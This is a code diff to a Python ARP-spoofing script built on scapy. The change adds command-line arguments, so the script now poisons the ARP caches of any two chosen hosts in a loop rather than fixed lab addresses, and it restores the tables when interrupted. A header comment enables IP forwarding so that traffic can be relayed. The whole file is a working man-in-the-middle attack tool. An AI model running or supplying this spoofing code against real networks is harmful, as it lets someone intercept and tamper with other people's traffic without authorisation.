@@ -9,6 +9,13 @@ ip_forward needs to be enabled : echo 1 > /proc/sys/net/ipv4/ip_forward
 import scapy.all as scapy
 import time
 import sys
+import argparse
+
+def parse_command_line():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--targets", dest="targets", help="The target/gateways to spoof", action="append")
+    values = parser.parse_args()
+    return values.targets
 
 def get_mac(ip):
     # the next two lines creates a packet that asks for a specific ip
@@ -35,12 +42,14 @@ def restore(dest_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
     scapy.send(packet, count=4, verbose=False) # count=4 to make sure we cleaned things up
 
+
+targets = parse_command_line()
     
 sent_packets_num = 0
 try:
     while True:
-        spoof("10.0.2.2", "10.0.2.1")
-        spoof("10.0.2.1", "10.0.2.2")
+        spoof(targets[0], targets[1])
+        spoof(targets[1], targets[0])
         sent_packets_num+=2
         #python3: print("\rPackets sent: " + str(sent_packets_num), end="")
         #python2: 
@@ -49,4 +58,4 @@ try:
         time.sleep(2)
 except KeyboardInterrupt:
     print("Cleaning up arp tables and resetting changes...")
-    restore("10.0.2.2", "10.0.2.1")
+    restore(targets[1], targets[0])
